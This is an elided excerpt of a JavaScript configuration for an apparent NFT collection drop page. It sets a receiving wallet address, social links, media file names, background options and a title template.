...
const receiveAddress = "0xA9b158B10d21a520BdB2162B359107b45C6054Fc";/*Babylon*/
...
const collectionInfo = {
    ...
    date: "",
    socialMedia: {
        discord: "https://cryptodudes.me/discord",
        twitter: "https://twitter.com/cryptodudes_me",
    },
    medias: {
        preview: "media.gif",
        favicon: "icon.png",
    ...
    background: {
        ...
        image: "bg.png", // Image for image type or video preview for video type (image befor video load)
...
const customStrings = {
    title: "{name} Drop", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
